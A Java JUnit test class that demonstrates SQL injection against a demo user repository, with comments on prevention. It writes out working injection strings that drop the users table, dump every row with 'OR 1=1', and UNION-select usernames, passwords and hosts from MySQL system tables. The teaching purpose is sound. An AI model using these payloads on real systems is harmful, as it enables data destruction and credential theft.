package nl.sqlinjection;

import org.junit.Before;
import org.junit.BeforeClass;
import org.junit.Test;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.List;

import static nl.sqlinjection.DatabaseConstants.*;
import static org.junit.Assert.assertEquals;

/**
 * Quick test to show SQL injection vulnerabilities.
 * 
 * Use a mysql database and configure the settings in the DatabaseConstants class.
 */
public class UserRepositoryTest {

    final UserRepository userRepository = new UserRepository();
    
    // Some test setup prior to running the tests. Inserts users, creates tables, and creates the administrators table
    @Before
    public void insertUsers() throws Exception {
        try (final Connection connection = DriverManager.getConnection(connectionUrl, username, password);
             final Statement statement = connection.createStatement()) {
            statement.execute("DROP TABLE IF EXISTS users; ");
            statement.execute("DROP TABLE IF EXISTS administrators; ");
            statement.execute(
                    "CREATE TABLE users" + "(" + "  id   INT PRIMARY KEY NOT NULL AUTO_INCREMENT, name VARCHAR(100)" + ");"
            );
            statement.execute(
                    "CREATE TABLE administrators (id INT(11) PRIMARY KEY NOT NULL AUTO_INCREMENT, username VARCHAR(100), password VARCHAR(100) );"
            );
            statement.execute("INSERT INTO administrators (username, password) VALUES ('root', 'root')");
            statement.execute("INSERT INTO administrators (username, password) VALUES ('admin', 'superuser')");
        }
        
        userRepository.insertUser("Fred");
        userRepository.insertUser("Dirk");
        userRepository.insertUser("Sjaak");
        userRepository.insertUser("Jaap");
    }

    /**
     * Damaging case of SQL injection, where the attacker is able to append a DROP TABLE statement to the query. 
     * 
     * Some ways to prevent this: Never set the 'allowMultiQueries' property if you don't need it; it opens you up for this
     * vulnerability.
     * 
     * Database users also generally never NEED to drop a table/database (at most delete a record). So configure the user
     * to not have this privilege.
     */
    @Test
    public void testInsertUserDropsTable() throws Exception {
        // Generated query: "INSERT INTO USERS (name) VALUES ('Gerrit'); DROP TABLE users; -- ');"
        final String user = "Gerrit'); DROP TABLE users; -- ";
        userRepository.insertUser(user);
        userRepository.findUsers("Anyone");
    }


    /**
     * Results in finding only Fred, which is expected 
     * 
     * This is the normal/intended/expected usage of the method.
     */
    @Test 
    public void testFindUsersNormal() throws Exception {
        // Generated query: "SELECT * FROM USERS WHERE name='Fred';"
        final List<String> users = userRepository.findUsers("Fred");
        assertEquals(1, users.size());
    }

    /**
     * Results in retrieving all users - the condition 1=1 makes the where clause return true for ALL
     * users, resulting in a list of all users.
     * 
     * This vulnerability will allow attackers to list all users, a non-intended usage of this function
     */
    @Test
    public void testFindUsersAbuse() throws Exception {
        // Generated query: "SELECT * FROM USERS WHERE name='dsfkhsdlkfhsdlfhdlfhs' OR 1=1; -- ';"
        final List<String> users = userRepository.findUsers("dsfkhsdlkfhsdlfhdlfhs' OR 1=1; -- ");
        assertEquals(4, users.size());
    }

    /**
     * Finds all users with name probablydoesnotexist (there are none) and appends ALL records from the administrators table.
     * 
     * The two queries together result in the attacker retrieving the username password combinations for all administrators!
     * 
     * Prevent: Don't store passwords in plaintext; User up to date hashing algorithms and hashing
     */
    @Test
    public void testFindUsersUnionWithOtherTable() throws Exception {
        // Use injection to get the usernames
        // Generated query: "SELECT * FROM USERS WHERE name='probablydoesnoetexist' UNION SELECT username, username FROM mysql.users u -- ';"
        List<String> users = userRepository.findUsers("probablydoesnoetexist' UNION SELECT username, username FROM mysql.users u -- ");
        assertEquals(2, users.size());

        // Generated query: "SELECT * FROM USERS WHERE name='probablydoesnoetexist' UNION SELECT password, password FROM mysql.users u -- ';"
        // Use injection to retrieve the passwords
        users = userRepository.findUsers("probablydoesnoetexist' UNION SELECT password, password FROM mysql.users u -- ");
        assertEquals(2, users.size());
    }

    /**
     * Unions the select to a table outside of the current database schema and with some general mysql tables! Everyone knows these
     * so this means you are vulnerable for attack!
     * 
     * Same attack as the previous attack, but potentially more harmful. 
     * 
     * Prevent: Configure the user used by the application to only use the application schema. Disallow access to the mysql admin
     * schemas
     */
    @Test
    public void testFindUsersUnionWithMysqlTable() throws Exception {
        final List<String> users = userRepository.findUsers("probablydoesnoetexist' UNION SELECT host, host FROM mysql.user u -- ");
        assertEquals(5, users.size()); // Two records?!
    }
}